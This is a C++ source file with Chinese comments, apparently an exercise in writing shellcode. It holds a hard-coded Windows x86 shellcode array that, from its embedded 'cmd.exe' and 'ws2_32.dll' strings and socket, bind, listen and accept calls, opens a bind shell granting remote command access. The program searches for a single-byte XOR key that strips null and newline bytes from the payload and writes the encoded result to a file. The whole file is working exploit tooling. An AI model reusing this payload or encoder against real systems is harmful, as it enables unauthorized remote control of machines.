// 005对004的shellcoee做除去指定字符处理,防止截断.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>


unsigned char pShellCode[] =
{ 0x83, 0xEC, 0x20, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0xEB, 0x20, 0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x77, 0x73, 0x32, 0x5F, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x6B, 0x65,
0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x89, 0x5D, 0xFC, 0x64, 0x8B, 0x35, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x76, 0x0C, 0x8B, 0x76,
0x1C, 0x8B, 0x36, 0x8B, 0x56, 0x08, 0x52, 0x68, 0x87, 0x32, 0xD8, 0xC0, 0xE8, 0xBA, 0x01, 0x00, 0x00, 0x8B, 0xF8, 0x8D, 0x73, 0xEE, 0x6A, 0x00, 0x6A, 0x00, 0x56, 0xFF, 0xD7, 0x89, 0x45, 0xF8,
0x8D, 0x73, 0xE3, 0x6A, 0x00, 0x6A, 0x00, 0x56, 0xFF, 0xD7, 0x89, 0x45, 0xF4, 0xFF, 0x75, 0xF4, 0xFF, 0x75, 0xF8, 0xFF, 0x75, 0xFC, 0xE8, 0x11, 0x00, 0x00, 0x00, 0xFF, 0x75, 0xF8, 0x68, 0x63,
0x89, 0xD1, 0x4F, 0xE8, 0x83, 0x01, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0xD0, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x00, 0x03, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0x3D, 0x6A, 0xB4, 0x80, 0xE8, 0x69, 0x01,
0x00, 0x00, 0x8D, 0xB5, 0x00, 0xFD, 0xFF, 0xFF, 0x56, 0x68, 0x02, 0x02, 0x00, 0x00, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x85, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0x2D, 0x32, 0x78, 0xDE,
0xE8, 0x46, 0x01, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x06, 0x6A, 0x01, 0x6A, 0x02, 0xFF, 0xD0, 0x89, 0x45, 0xFC, 0xFF, 0x75, 0x10, 0x68, 0x64, 0x10, 0xA7, 0xDD, 0xE8, 0x28,
0x01, 0x00, 0x00, 0x66, 0xC7, 0x85, 0x00, 0xFE, 0xFF, 0xFF, 0x02, 0x00, 0x66, 0xC7, 0x85, 0x02, 0xFE, 0xFF, 0xFF, 0x05, 0xEB, 0xC7, 0x85, 0x04, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x8D,
0xB5, 0x00, 0xFE, 0xFF, 0xFF, 0x6A, 0x14, 0x56, 0xFF, 0x75, 0xFC, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x85, 0xA2, 0x00, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0x0C, 0x9F, 0xD3, 0x4B, 0xE8, 0xE9, 0x00,
0x00, 0x00, 0x68, 0xFF, 0xFF, 0xFF, 0x7F, 0xFF, 0x75, 0xFC, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x85, 0x83, 0x00, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0xB1, 0x1E, 0x97, 0x01, 0xE8, 0xCA, 0x00, 0x00,
0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0x75, 0xFC, 0xFF, 0xD0, 0x89, 0x45, 0xFC, 0xFF, 0x75, 0x0C, 0x68, 0xC9, 0xBC, 0xA6, 0x6B, 0xE8, 0xB1, 0x00, 0x00, 0x00, 0x8B, 0xD0, 0x8D, 0xBD, 0x70, 0xFF,
0xFF, 0xFF, 0xB9, 0x11, 0x00, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xFC, 0xF3, 0xAB, 0xC7, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x44, 0x00, 0x00, 0x00, 0xC7, 0x45, 0x9C, 0x00, 0x01, 0x00, 0x00,
0x66, 0xC7, 0x45, 0xA0, 0x00, 0x00, 0x8B, 0x75, 0xFC, 0x89, 0x75, 0xA8, 0x89, 0x75, 0xAC, 0x89, 0x75, 0xB0, 0x8D, 0xB5, 0x70, 0xFF, 0xFF, 0xFF, 0x8D, 0xBD, 0x00, 0xFE, 0xFF, 0xFF, 0x8B, 0x5D,
0x08, 0x8D, 0x5B, 0xDB, 0x57, 0x56, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x00, 0x53, 0x6A, 0x00, 0xFF, 0xD2, 0x8B, 0xE5, 0x5D, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC,
0x83, 0xEC, 0x04, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x53, 0x51, 0x52, 0x8B, 0x75, 0x08, 0x33, 0xC9, 0x33, 0xC0, 0x8A, 0x04, 0x0E, 0x84, 0xC0, 0x74, 0x16, 0x8B, 0x5D, 0xFC, 0xC1, 0xE3,
0x19, 0x8B, 0x55, 0xFC, 0xC1, 0xEA, 0x07, 0x0B, 0xDA, 0x03, 0xD8, 0x89, 0x5D, 0xFC, 0x41, 0xEB, 0xE3, 0x8B, 0x5D, 0x0C, 0x8B, 0x55, 0xFC, 0x33, 0xC0, 0x3B, 0xDA, 0x75, 0x05, 0xB8, 0x01, 0x00,
0x00, 0x00, 0x5A, 0x59, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x08, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C, 0x52, 0x8B, 0x55, 0x0C, 0x8B, 0x72, 0x3C, 0x8D, 0x34, 0x32, 0x8B, 0x76, 0x78, 0x8D, 0x34,
0x32, 0x8B, 0x7E, 0x1C, 0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xFC, 0x8B, 0x7E, 0x20, 0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xF8, 0x8B, 0x7E, 0x24, 0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xF4, 0x33, 0xC9, 0xEB, 0x01,
0x41, 0x8B, 0x75, 0xF8, 0x8B, 0x34, 0x8E, 0x8B, 0x55, 0x0C, 0x8D, 0x34, 0x32, 0xFF, 0x75, 0x08, 0x56, 0xE8, 0x67, 0xFF, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xE6, 0x8B, 0x75, 0xF4, 0x33, 0xFF, 0x66,
0x8B, 0x3C, 0x4E, 0x8B, 0x55, 0xFC, 0x8B, 0x34, 0xBA, 0x8B, 0x55, 0x0C, 0x8D, 0x04, 0x32, 0x5A, 0x8B, 0xE5, 0x5D, 0xC2, 0x08, 0x00 };


bool Encode(unsigned char *pShellcode, int nSize, unsigned char &ucKey);

int _tmain(int argc, _TCHAR* argv[])
{
	unsigned char ucKey = 0;
	bool bRet = Encode(pShellCode, sizeof(pShellCode), ucKey);
	if (bRet)
	{
		//保存起来
		OPENFILENAMEA ofn;       // 公共对话框结构。
		char szFile[MAX_PATH]; // 保存获取文件名称的缓冲区。          
		// 初始化选择文件对话框。
		ZeroMemory(&ofn, sizeof(ofn));
		ofn.lStructSize = sizeof(ofn);
		ofn.hwndOwner = NULL;
		ofn.lpstrFile = szFile;

		//
		ofn.lpstrFile[0] = 0;
		ofn.nMaxFile = sizeof(szFile);
		ofn.lpstrFilter = "All/0*.*/0Text/0*.TXT/0";
		ofn.nFilterIndex = 1;
		ofn.lpstrFileTitle = NULL;
		ofn.nMaxFileTitle = 0;
		ofn.lpstrInitialDir = NULL;
		ofn.Flags = OFN_SHOWHELP | OFN_OVERWRITEPROMPT;

		// 显示打开选择文件对话框。
		if (GetSaveFileNameA(&ofn))
		{
			FILE *fp = NULL;
			fopen_s(&fp, szFile, "w+");
			if (NULL == fp)
			{
				printf("打开文件失败\n");
			}
			else
			{
				//1. 写入key
				fprintf_s(fp, "0x%02X,0x%08X,\n", ucKey, sizeof(pShellCode));
				//3.写入加密后的shellcode
				for (int i = 0; i < sizeof(pShellCode); i++)
				{
					if (i == sizeof(pShellCode)-1)
					{
						fprintf_s(fp, "0x%02X", pShellCode[i]);
					}
					else
					{
						fprintf_s(fp, "0x%02X, ", pShellCode[i]);
					}

					if (i != 0 && (i + 1) % 8 == 0)
					{
						fprintf_s(fp, "\n");
					}
				}
				fclose(fp);
			}
		}
		else
		{
			printf("保存文件失败\n");
		}
	}
	else
	{
		printf("没有找到合适的key给shellcode加密\n");
	}
	return 0;
}

bool Encode(unsigned char *pShellcode, int nSize, unsigned char &ucKey)
{
	unsigned char* pTmpBuff = new unsigned char[nSize];
	bool bComplete;
	for (unsigned int i = 0; i < 0xFF; i++)
	{
		bComplete = true;
		memcpy(pTmpBuff, pShellcode, nSize);
		for (int j = 0; j < nSize; j++)
		{
			pTmpBuff[j] = pTmpBuff[j] ^ (unsigned char)i;
			if (0x00 == pTmpBuff[j] || 0xA == pTmpBuff[j] || 0x0D == pTmpBuff[j])
			{
				bComplete = false;
				break;
			}
		}
		if (bComplete)
		{
			ucKey = i;
			break;
		}
	}

	if (bComplete)
	{
		memcpy(pShellcode, pTmpBuff, nSize);
		delete pTmpBuff;
		return true;
	}
	else
	{
		delete pTmpBuff;
		return false;
	}
}

